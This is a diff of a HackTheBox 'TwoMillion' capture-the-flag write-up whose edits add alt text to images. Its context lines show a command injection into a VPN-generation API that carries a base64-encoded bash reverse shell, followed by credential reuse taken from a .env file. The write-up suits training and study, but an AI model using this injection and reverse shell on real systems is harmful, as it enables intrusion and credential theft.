@@ -1,4 +1,4 @@
-<figure><img src="/assets/htb/TwoMillion/banner.png"></figure>
+<figure><img src="/assets/htb/TwoMillion/banner.png" alt="TwoMillion Banner"></figure>
 
 ### Target IP 10.10.11.221
 
@@ -20,15 +20,15 @@ I added `2million.htb` to `/etc/hosts` file.
 
 On opening the URL there is an older version of HackTheBox webpage.
 
-<figure><img src="/assets/htb/TwoMillion/homepage.png"></figure>
+<figure><img src="/assets/htb/TwoMillion/homepage.png" alt="Homepage of the website"></figure>
 
 On inspecting the source code in the `/invite` endpoint. There is a minified js file.
 
-<figure><img src="/assets/htb/TwoMillion/unpacked.png"></figure>
+<figure><img src="/assets/htb/TwoMillion/unpacked.png" alt="Deminified version of minjs file"></figure>
 
 After clicking on `auto-decode`, It gave us the code.
 
-<figure><img src="/assets/htb/TwoMillion/decoded.png"></figure>
+<figure><img src="/assets/htb/TwoMillion/decoded.png" alt="Decoded the js to request files"></figure>
 
 I sent a request to the endpoint `/api/v1/invite/how/to/generate` and got the following response.
 
@@ -51,7 +51,7 @@ I sent a request to the endpoint `/api/v1/invite/how/to/generate` and got the fo
 
 The response says that the data is encrypted in `ROT13`, On decrypting the data we get the following message.
 
-<figure><img src="/assets/htb/TwoMillion/rot13.png"></figure>
+<figure><img src="/assets/htb/TwoMillion/rot13.png" alt="Decrypted ROT13 text"></figure>
 
 So let's generate an invite code.
 
@@ -81,11 +81,11 @@ U0IGQ-CROBY-0TQLY-XWUJJ
 
 Let's make an account using this invite code.
 
-<figure><img src="/assets/htb/TwoMillion/register.png"></figure>
+<figure><img src="/assets/htb/TwoMillion/register.png" alt="Register Page"></figure>
 
 After logging in with the same credentials, we are redirected to the home page.
 
-<figure><img src="/assets/htb/TwoMillion/htbdashboard.png"></figure>
+<figure><img src="/assets/htb/TwoMillion/htbdashboard.png" alt="Dashboard of the website"></figure>
 
 Most of the pages took us to `/access` which was a VPN download page.
 
@@ -247,7 +247,7 @@ Let's try to generate an admin VPN now.
 
 I added the username in the data field.
 
-<figure><img src="/assets/htb/TwoMillion/generate.png"></figure>
+<figure><img src="/assets/htb/TwoMillion/generate.png" alt="Generate Admin VPN Configuration"></figure>
 
 Since its sending the VPN through the command, It might be possible its running it from `exec` or `system` PHP commands. It might be possible to inject commands by using `;id;` after the username.
 
@@ -264,7 +264,7 @@ Let's try to put in a reverse shell.
 └─$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=cc3n1i5cmnodhcva9ugr2saprf" --header "Content-Type: application/json" --data '{"username": "testuser;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40NC80NDQ0IDA+JjEK | base64 -d | bash;"}' 
 ```
 
-<figure><img src="/assets/htb/TwoMillion/wwwdata.png"></figure>
+<figure><img src="/assets/htb/TwoMillion/wwwdata.png" alt="Shell as www-data"></figure>
 
 On enumeration of the web directory there was a file `.env` which had some credentials.
 
@@ -283,7 +283,7 @@ On looking at the `passwd` file there was another user called `admin`.
 
 I ssh'd into the user admin using the `DB_PASSWORD`.
 
-<figure><img src="/assets/htb/TwoMillion/admin.png"></figure>
+<figure><img src="/assets/htb/TwoMillion/admin.png" alt="ssh as admin user"></figure>
 
 And I got the user flag.
 
